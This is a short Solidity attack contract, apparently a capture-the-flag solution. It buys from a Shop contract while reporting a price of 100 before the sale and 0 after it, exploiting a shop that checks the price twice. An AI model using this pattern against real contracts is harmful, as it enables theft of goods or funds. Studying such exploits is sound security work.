// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./Shop.sol";

contract ShopAttack is Buyer{
    Shop public shop;
    constructor(address shopAddress)public{
        shop = Shop(shopAddress);
    }

    function buy()public{
        shop.buy();
    }

    function price() public view override returns (uint){
        return shop.isSold() ? 0 : 100;
    }
}